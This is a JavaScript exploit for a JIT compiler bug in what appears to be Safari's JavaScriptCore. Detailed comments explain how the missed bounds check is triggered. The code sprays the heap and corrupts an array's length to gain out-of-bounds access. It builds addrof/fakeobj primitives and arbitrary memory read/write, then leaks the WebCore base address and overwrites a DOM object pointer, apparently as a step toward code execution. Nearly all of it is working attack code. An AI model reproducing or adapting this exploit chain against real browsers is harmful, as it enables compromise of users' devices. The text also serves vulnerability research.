// This is an upper limit on the number of iterations. Functions
// that need to be JITed will attempt to detect when they
// have been compiled, then break out of the compilation loop.
const ITERATIONS = 10000000;
const NUM_REGS = 32;

function hax(arr, n) {
    // Force n to be a 32bit integer.
    n |= 0;

    // Let IntegerRangeOptimization know that n will be a negative number inside the body.
    if (n < 0) {
        // Force "non-number bytecode usage" so the negation becomes unchecked and as such
        // INT_MIN will again become INT_MIN in the last iteration.
        let v = (-n)|0;

        // As n is known to be negative here, this ArithAbs will become a ArithNegate.
        // That negation will be checked, but then be CSE'd for the previous, unchecked one.
        // This is the compiler bug.
        let i = Math.abs(n);

        // However, IntegerRangeOptimization has also marked i as being >= 0...

        if (i < arr.length) {
            // .. so here IntegerRangeOptimization now believes i will be in the range [0, arr.length)
            // while i will actually be INT_MIN in the final iteration.

            // This condition is written this way so integer range optimization isn't
            // able to propagate range information (in particular that i must be a negative integer)
            // into the body.
            if (i & 0x80000000) {
                // In the last iteration, this will turn INT_MIN into an arbitrary,
                // positive number since the ArithAdd has been made unchecked by
                // integer range optimization (as it believes i to be a positive number)
                // and so doesn't bail out when overflowing int32.
                i += -0x7ffffff9;
            }

            // This condition is necessary due to the subtraction above.
            if (i > 0) {
                // In here, IntegerRangeOptimization again believes i to be in the range [0, arr.length)
                // and thus eliminates the CheckBounds node, leading to a controlled OOB access.
                // This write will the corrupt the header of the following JSArray, setting its
                // length and capacity to 0x1337.
                arr[i] = 1.04380972981885e-310;
            }
        }
    }
}

// Setup the well-known low-level exploit primitives.
function setup_addrof_fakeobj() {
    // Must have at least one non-literal in the array literals below to avoid CopyOnWrite arrays.
    let noCoW = 13.37;

    // Fill any existing holes in the heap.
    let spray = [];
    for (let i = 0; i < 10000; i++) {
        let arr = [noCoW, 1.1, 2.2, 3.3, 4.4, 5.5, 6.6];
        spray.push(arr);
    }

    // The butterflies of these three arrays should be placed immediately after each other
    // in memory. We will corrupt the length of float_arr by OOB writing into target. Afterwards,
    // we can do easy double <-> JSValue type confusions.
    let target = [noCoW, 1.1, 2.2, 3.3, 4.4, 5.5, 6.6];
    let float_arr = [noCoW, 1.1, 2.2, 3.3, 4.4, 5.5, 6.6];
    let obj_arr = [{}, {}, {}, {}, {}, {}, {}];

    // Force JIT (mis)compilation and exploit the bug to corrupt the length of float_arr.
    //
    // Note: to make this even more reliable, exploit the bug for an OOB read first
    // and read some markers (i.e. some unique integer values) from the following
    // two arrays to be sure that we got the right heap layout
    // (i.e. target directly followed by float_arr directly followed by obj_arr).
    for (let i = 0; i < ITERATIONS; i++) {
        let isLastIteration = i == ITERATIONS - 1;
        let n = -(i % 10);
        if (isLastIteration) {
            n = -2147483648;
        }
        hax(target,n);
    }

    if(float_arr.length == 0x1337) {
        log("[*] JSArray.length = 0x" + float_arr.length.toString(16));
        log("[*] Successful corrupted JSArray");
        // return;
    }

    // (OOB) index into float_arr that overlaps with the first element of obj_arr.
    // Index 7 (directly behind the last element) overlaps with the header of the next butterfly.
    const OVERLAP_IDX = 8;

    let addrof = function addrof(obj) {
        obj_arr[0] = obj;
        return float_arr[OVERLAP_IDX];
    }

    let fakeobj = function fakeobj(addr) {
        float_arr[OVERLAP_IDX] = addr;
        return obj_arr[0];
    }

    return [addrof, fakeobj];
}

function pwn() {
     let [raw_addrof, raw_fakeobj] = setup_addrof_fakeobj();

    // Convenience wrappers to use Int64
    function addrof(obj) {
        return Int64.fromDouble(raw_addrof(obj));
    }
    function fakeobj(addr) {
        return raw_fakeobj(addr.asDouble());
    }

    // Create a legit, non-CoW float array to copy a JSCell header from.
    let float_arr = [Math.random(), 1.1, 2.2, 3.3, 4.4, 5.5, 6.6];

    // Now fake a JSArray whose butterfly points to an unboxed double JSArray.
    let jscell_header = new Int64([
        0x00, 0x10, 0x00, 0x00,     // m_structureID
        0x7,                        // m_indexingType (ArrayWithDouble)
        0x23,                       // m_type
        0x08,                       // m_flags
        0x1                         // m_cellState
    ]).asDouble();

    let container = {
        jscell_header: jscell_header,
        butterfly: float_arr,
    };

    let container_addr = addrof(container);
    let fake_array_addr = Add(container_addr, 16);
    log("[*] Fake JSArray @ " + fake_array_addr);

    let fake_arr = fakeobj(fake_array_addr);

    // Can now simply read a legitimate JSCell header and use it.
    // However, the op_get_by_val will cache the last seen structure id
    // and use that e.g. during GC. To avoid crashing at that point,
    // we simply execute the op_get_by_val twice.
    let legit_arr = float_arr;
    let results = [];
    for (let i = 0; i < 2; i++) {
        let a = i == 0 ? fake_arr : legit_arr;
        results.push(a[0]);
    }
    jscell_header = results[0];
    container.jscell_header = jscell_header;
    log(`[*] Copied legit JSCell header: ${Int64.fromDouble(jscell_header)}`);

    log("[+] Achieved limited arbitrary read/write \\o/");

    // The controller array writes into the memarr array.
    let controller = fake_arr;
    let memarr = float_arr;

    // Primitives to read/write memory as 64bit floating point values.
    function read64(addr) {
        let oldval = controller[1];
        let res;
        let i = 0;
        do {
            controller[1] = addr.asDouble();
            res = memarr[i];
            addr = Sub(addr, 8);
            i += 1;
        } while (res === undefined);
        controller[1] = oldval;
        return Int64.fromDouble(res);
    }

    function write64(addr, val) {
        let oldval = controller[1];
        let res;
        let i = 0;
        do {
            controller[1] = addr.asDouble();
            res = memarr[i];
            addr = Sub(addr, 8);
            i += 1;
        } while (res === undefined);
        memarr[i-1] = val.asDouble();
        controller[1] = oldval;
    }

    var malloc_nogc = [];
    function malloc(sz) {
        var arr = new Uint8Array(sz);
        malloc_nogc.push(arr);
        return read64(Add(addrof(arr), 0x10));
    }

    var spectre = (typeof SharedArrayBuffer !== 'undefined'); 
    var FPO = spectre ? 0x18 : 0x10; 
    log(`[*] FPO: ${FPO}`);

    var wrapper = document.createElement('div');
    var wrapper_addr = addrof(wrapper);
    log(`[*] wrapper_addr = ${(wrapper_addr)}`); 
    var el_addr = read64(Add(wrapper_addr, FPO));
    log(`[*] el_addr = ${(el_addr)}`); 
    var vtab_addr = read64(el_addr);
    log(`[*] vtab_addr = ${(vtab_addr)}`);

    var webcore_base = Sub(vtab_addr, 0x187f75c);
    log(`[+] webcore base = ${(webcore_base)}`); 
    var read_webcore = read64(webcore_base);
    log(`[i] webcore read test = ${read_webcore}`);

    //just for test
    var bss_addr = Add(webcore_base, 0x2ef3b170);
    var read_bss = read64(bss_addr);
    log(`[i] bss read test = ${read_bss}`);
    write64(bss_addr, new Int64(0x4142434445464748));
    read_bss = read64(bss_addr);
    log(`[i] bss read test = ${read_bss}`);

    var wrapper = document.createElement('div');
    var wrapper_addr = addrof(wrapper);

    write64(Add(wrapper_addr, FPO + 8), new Int64(0x4142434445464748));
    wrapper.addEventListener("click", function(){ }); 

    return;
}